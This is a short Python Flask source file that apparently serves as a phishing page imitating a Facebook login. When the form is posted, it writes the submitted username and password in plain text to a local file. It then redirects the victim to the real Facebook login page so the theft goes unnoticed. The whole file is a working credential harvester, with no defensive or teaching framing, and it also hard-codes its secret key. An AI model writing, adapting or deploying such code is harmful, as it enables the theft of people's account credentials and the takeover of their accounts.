from flask import Flask, render_template, request, url_for, redirect, send_file, session


app = Flask(__name__)
app.config['SECRET_KEY'] = "645c0fa2968af9d5e6a9b3edcbc7051b"



@app.route("/", methods = ["GET", "POST"])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('pswd')
        try:
            with open("data.txt", 'a') as f:
                f.write(str(f"username: {username}"))
                f.write('\n')
                f.write(str(f"passwd: {password}"))
                f.write('\n')

        except:
            return render_template('index.html')
        return redirect("https://www.facebook.com/login")
    return render_template('index.html')


if __name__ == '__main__':
    app.run()
